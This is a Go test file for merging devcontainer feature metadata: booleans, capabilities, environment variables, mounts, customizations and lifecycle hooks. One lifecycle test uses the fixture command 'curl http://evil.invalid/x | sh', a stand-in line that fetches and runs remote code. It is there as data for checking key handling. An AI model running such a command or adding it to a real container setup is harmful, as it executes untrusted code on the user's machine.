package feature

import (
	"testing"

	"github.com/tailscale/hujson"
)

func TestMergeBool(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		user     string
		features []string
		want     string
	}{
		{
			name:     "absent member is added",
			user:     `{}`,
			features: []string{`{"id": "f", "init": true, "privileged": true}`},
			want:     `{"init": true, "privileged": true}`,
		},
		{
			name:     "explicit false is overridden",
			user:     `{"privileged": false}`,
			features: []string{`{"id": "f", "privileged": true}`},
			want:     `{"privileged": true}`,
		},
		{
			name:     "null is overridden",
			user:     `{"init": null}`,
			features: []string{`{"id": "f", "init": true}`},
			want:     `{"init": true}`,
		},
		{
			name:     "feature false contributes nothing",
			user:     `{}`,
			features: []string{`{"id": "f", "privileged": false}`},
			want:     `{}`,
		},
		{
			name:     "true from any contributor wins",
			user:     `{}`,
			features: []string{`{"id": "a", "init": false}`, `{"id": "b", "init": true}`},
			want:     `{"init": true}`,
		},
		{
			// Any value that is not an explicit false or null is left for the correctness rules to
			// report, rather than silently overwritten.
			name:     "malformed user value is left untouched",
			user:     `{"privileged": "yes"}`,
			features: []string{`{"id": "f", "privileged": true}`},
			want:     `{"privileged": "yes"}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assertJSON(t, applyMerge(t, tt.user, tt.features...), tt.want)
		})
	}
}

func TestMergeUnion(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		user     string
		features []string
		want     string
	}{
		{
			name: "arrays are the deduplicated union",
			user: `{}`,
			features: []string{
				`{"id": "a", "capAdd": ["SYS_PTRACE", "NET_ADMIN"]}`,
				`{"id": "b", "capAdd": ["NET_ADMIN", "SYS_ADMIN"]}`,
			},
			want: `{"capAdd": ["SYS_PTRACE", "NET_ADMIN", "SYS_ADMIN"]}`,
		},
		{
			name:     "user entries are preserved and deduplicated against",
			user:     `{"capAdd": ["SYS_PTRACE"]}`,
			features: []string{`{"id": "f", "capAdd": ["SYS_PTRACE", "NET_ADMIN"]}`},
			want:     `{"capAdd": ["SYS_PTRACE", "NET_ADMIN"]}`,
		},
		{
			name:     "non-string elements are skipped",
			user:     `{}`,
			features: []string{`{"id": "f", "capAdd": ["A", 1, true, "B"]}`},
			want:     `{"capAdd": ["A", "B"]}`,
		},
		{
			name:     "a non-array feature value contributes nothing",
			user:     `{}`,
			features: []string{`{"id": "f", "capAdd": "SYS_PTRACE"}`},
			want:     `{}`,
		},
		{
			name:     "a non-array user value is left untouched",
			user:     `{"capAdd": "SYS_PTRACE"}`,
			features: []string{`{"id": "f", "capAdd": ["NET_ADMIN"]}`},
			want:     `{"capAdd": "SYS_PTRACE"}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assertJSON(t, applyMerge(t, tt.user, tt.features...), tt.want)
		})
	}
}

func TestMergeEnv(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		user     string
		features []string
		want     string
	}{
		{
			name: "user key wins and the later contributor wins the rest",
			user: `{"containerEnv": {"USER_VAR": "user"}}`,
			features: []string{
				`{"id": "a", "containerEnv": {"USER_VAR": "a", "SHARED": "a", "A_ONLY": "a"}}`,
				`{"id": "b", "containerEnv": {"SHARED": "b"}}`,
			},
			want: `{"containerEnv": {"USER_VAR": "user", "SHARED": "b", "A_ONLY": "a"}}`,
		},
		{
			name:     "containerEnv is created when absent",
			user:     `{}`,
			features: []string{`{"id": "f", "containerEnv": {"KEY": "value"}}`},
			want:     `{"containerEnv": {"KEY": "value"}}`,
		},
		{
			name:     "a non-object feature value contributes nothing",
			user:     `{}`,
			features: []string{`{"id": "f", "containerEnv": "oops"}`},
			want:     `{}`,
		},
		{
			name:     "a non-object user value is left untouched",
			user:     `{"containerEnv": "oops"}`,
			features: []string{`{"id": "f", "containerEnv": {"KEY": "value"}}`},
			want:     `{"containerEnv": "oops"}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assertJSON(t, applyMerge(t, tt.user, tt.features...), tt.want)
		})
	}
}

func TestMergeMounts(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		user     string
		features []string
		want     string
	}{
		{
			name: "entries dedupe by target with the last contributor winning",
			user: `{}`,
			features: []string{
				`{"id": "a", "mounts": ["target=/cache,type=volume,source=a"]}`,
				`{"id": "b", "mounts": ["target=/cache,type=volume,source=b"]}`,
			},
			want: `{"mounts": ["target=/cache,type=volume,source=b"]}`,
		},
		{
			name:     "a target the user mounts always wins",
			user:     `{"mounts": [{"target": "/data", "source": "user"}]}`,
			features: []string{`{"id": "f", "mounts": [{"target": "/data", "source": "f"}]}`},
			want:     `{"mounts": [{"target": "/data", "source": "user"}]}`,
		},
		{
			// A string entry and an object entry that name the same target still deduplicate.
			name: "object and string forms dedupe by target",
			user: `{}`,
			features: []string{
				`{"id": "a", "mounts": [{"target": "/x", "type": "volume", "source": "a"}]}`,
				`{"id": "b", "mounts": ["target=/x,type=volume,source=b"]}`,
			},
			want: `{"mounts": ["target=/x,type=volume,source=b"]}`,
		},
		{
			// An entry whose target cannot be determined has no key to dedupe on, so every such entry is
			// kept, even two identical ones.
			name: "target-less entries pass through",
			user: `{}`,
			features: []string{
				`{"id": "a", "mounts": ["source=s,type=volume"]}`,
				`{"id": "b", "mounts": ["source=s,type=volume"]}`,
			},
			want: `{"mounts": ["source=s,type=volume", "source=s,type=volume"]}`,
		},
		{
			name:     "a non-array user value is left untouched",
			user:     `{"mounts": "oops"}`,
			features: []string{`{"id": "f", "mounts": ["target=/cache,type=volume"]}`},
			want:     `{"mounts": "oops"}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assertJSON(t, applyMerge(t, tt.user, tt.features...), tt.want)
		})
	}
}

func TestFinishCustomizations(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		user     string
		features []string
		want     string
	}{
		{
			name: "later contributor wins scalars and arrays concatenate",
			user: `{}`,
			features: []string{
				`{"id": "a", "customizations": {"vscode": {"settings": {"x": "a"}, "extensions": ["e1"]}}}`,
				`{"id": "b", "customizations": {"vscode": {"settings": {"x": "b", "y": "b"}, "extensions": ["e2", "e1"]}}}`,
			},
			want: `{"customizations": {"vscode": {"settings": {"x": "b", "y": "b"}, "extensions": ["e1", "e2"]}}}`,
		},
		{
			name: "the user's own customizations win on top",
			user: `{"customizations": {"vscode": {"extensions": ["user.ext"], "settings": {"a": "user"}}}}`,
			features: []string{
				`{"id": "f", "customizations": {"vscode": {"extensions": ["feature.ext", "user.ext"], "settings": {"a": "feature", "b": "feature"}}}}`,
			},
			want: `{"customizations": {"vscode": {"extensions": ["feature.ext", "user.ext"], "settings": {"a": "user", "b": "feature"}}}}`,
		},
		{
			name:     "accumulated customizations are added when the user has none",
			user:     `{}`,
			features: []string{`{"id": "f", "customizations": {"vscode": {"extensions": ["e"]}}}`},
			want:     `{"customizations": {"vscode": {"extensions": ["e"]}}}`,
		},
		{
			// A customizations value that is not an object contributes nothing, so a later object-form
			// contributor stands alone.
			name: "a non-object customizations value is ignored",
			user: `{}`,
			features: []string{
				`{"id": "a", "customizations": ["oops"]}`,
				`{"id": "b", "customizations": {"vscode": {"extensions": ["e"]}}}`,
			},
			want: `{"customizations": {"vscode": {"extensions": ["e"]}}}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assertJSON(t, applyMerge(t, tt.user, tt.features...), tt.want)
		})
	}
}

func TestFinishLifecycle(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		user     string
		features []string
		want     string
	}{
		{
			name:     "user string command is kept under devcontainer.json",
			user:     `{"postCreateCommand": "make setup"}`,
			features: []string{`{"id": "f", "postCreateCommand": "f-setup.sh"}`},
			want:     `{"postCreateCommand": {"f": "f-setup.sh", "devcontainer.json": "make setup"}}`,
		},
		{
			name:     "user object command contributes its members",
			user:     `{"onCreateCommand": {"mine": "make setup"}}`,
			features: []string{`{"id": "f", "onCreateCommand": ["echo", "hi"]}`},
			want:     `{"onCreateCommand": {"f": ["echo", "hi"], "mine": "make setup"}}`,
		},
		{
			name:     "user array command is kept under devcontainer.json",
			user:     `{"postStartCommand": ["echo", "hi"]}`,
			features: []string{`{"id": "f", "postStartCommand": "f-start.sh"}`},
			want:     `{"postStartCommand": {"f": "f-start.sh", "devcontainer.json": ["echo", "hi"]}}`,
		},
		{
			name:     "hook is rewritten to object form with no user command",
			user:     `{}`,
			features: []string{`{"id": "f", "postStartCommand": "f-start.sh"}`},
			want:     `{"postStartCommand": {"f": "f-start.sh"}}`,
		},
		{
			name: "multiple features contribute one key each",
			user: `{"postCreateCommand": "make setup"}`,
			features: []string{
				`{"id": "a", "postCreateCommand": "a-setup.sh"}`,
				`{"id": "b", "postCreateCommand": ["echo", "b"]}`,
			},
			want: `{"postCreateCommand": {"a": "a-setup.sh", "b": ["echo", "b"], "devcontainer.json": "make setup"}}`,
		},
		{
			name: "same feature id collapses with the last winning",
			user: `{}`,
			features: []string{
				`{"id": "f", "postCreateCommand": "first"}`,
				`{"id": "f", "postCreateCommand": "second"}`,
			},
			want: `{"postCreateCommand": {"f": "second"}}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assertJSON(t, applyMerge(t, tt.user, tt.features...), tt.want)
		})
	}
}

// TestFinishLifecycle_ImageMetadataWithoutID guards against two id-less image-metadata entries
// contributing the same hook collapsing onto one key: every command must survive, matching the
// reference implementation, which runs them all.
func TestFinishLifecycle_ImageMetadataWithoutID(t *testing.T) {
	t.Parallel()

	root := parseValue(t, `{}`)
	obj, ok := root.Value.(*hujson.Object)
	if !ok {
		t.Fatal("root is not an object")
	}
	s := newMergeState(obj)
	// Both entries carry no "id", so they share the image reference as their synthesized key.
	for i, src := range []string{
		`{"postCreateCommand": "curl http://evil.invalid/x | sh"}`,
		`{"postCreateCommand": "echo ok"}`,
	} {
		md, err := parseMetadata([]byte(src))
		if err != nil {
			t.Fatalf("parse entry %d: %v", i, err)
		}
		s.apply(&contributor{ref: "registry.invalid/base:1", md: md, anchor: i + 1})
	}
	s.finish()

	assertJSON(t, &root, `{"postCreateCommand": {`+
		`"registry.invalid/base:1": "curl http://evil.invalid/x | sh", `+
		`"registry.invalid/base:1#2": "echo ok"}}`)
}

func TestDeepMerge(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		dst  string
		src  string
		want string
	}{
		{
			name: "objects merge member-wise and add new keys",
			dst:  `{"a": 1, "nested": {"x": 1}}`,
			src:  `{"b": 2, "nested": {"y": 2}}`,
			want: `{"a": 1, "b": 2, "nested": {"x": 1, "y": 2}}`,
		},
		{
			name: "string arrays append only the missing entries",
			dst:  `["a", "b"]`,
			src:  `["b", "c"]`,
			want: `["a", "b", "c"]`,
		},
		{
			// Only string elements are deduplicated; non-string entries have no identity, so duplicates
			// are appended as-is.
			name: "non-string array elements are always appended",
			dst:  `[1, "a"]`,
			src:  `[1, "a", 2]`,
			want: `[1, "a", 1, 2]`,
		},
		{
			name: "src wins a scalar conflict",
			dst:  `"dst"`,
			src:  `"src"`,
			want: `"src"`,
		},
		{
			name: "src replaces dst when the shapes differ (object then array)",
			dst:  `{"a": 1}`,
			src:  `[1, 2]`,
			want: `[1, 2]`,
		},
		{
			name: "src replaces dst when the shapes differ (array then object)",
			dst:  `[1, 2]`,
			src:  `{"a": 1}`,
			want: `{"a": 1}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			dst := parseValue(t, tt.dst)
			deepMerge(&dst, parseValue(t, tt.src))
			assertJSON(t, &dst, tt.want)
		})
	}
}

func TestMountTarget(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		src  string
		want string
	}{
		{name: "string target key", src: `"target=/x,type=volume"`, want: "/x"},
		{name: "string dst key", src: `"type=volume,dst=/y"`, want: "/y"},
		{name: "string destination key", src: `"destination=/z"`, want: "/z"},
		{name: "string whitespace is trimmed", src: `" target = /w "`, want: "/w"},
		{name: "string without a target key", src: `"source=s,type=volume"`, want: ""},
		{name: "object target key", src: `{"target": "/o", "type": "volume"}`, want: "/o"},
		{name: "object dst key", src: `{"dst": "/d"}`, want: "/d"},
		{name: "object without a target key", src: `{"type": "tmpfs", "source": "s"}`, want: ""},
		{name: "object non-string target value", src: `{"target": 42}`, want: ""},
		{name: "non-string literal", src: `42`, want: ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			v := parseValue(t, tt.src)
			if got := mountTarget(&v); got != tt.want {
				t.Errorf("mountTarget(%s) = %q, want %q", tt.src, got, tt.want)
			}
		})
	}
}

// applyMerge parses user as a devcontainer.json root object, applies each feature's parsed metadata
// as a contributor in order, and finishes the merge. Each contributor is anchored at a distinct
// offset, mirroring distinct "features" keys. It returns the merged tree for value assertions.
func applyMerge(t *testing.T, user string, features ...string) *hujson.Value {
	t.Helper()
	root := parseValue(t, user)
	obj, ok := root.Value.(*hujson.Object)
	if !ok {
		t.Fatalf("devcontainer.json root is not an object: %s", user)
	}
	s := newMergeState(obj)
	for i, src := range features {
		md, err := parseMetadata([]byte(src))
		if err != nil {
			t.Fatalf("parse feature %d metadata: %v", i, err)
		}
		s.apply(&contributor{ref: md.ID, md: md, anchor: i + 1})
	}
	s.finish()
	return &root
}

// parseValue parses src as hujson, failing the test on error.
func parseValue(t *testing.T, src string) hujson.Value {
	t.Helper()
	v, err := hujson.Parse([]byte(src))
	if err != nil {
		t.Fatalf("parse %q: %v", src, err)
	}
	return v
}
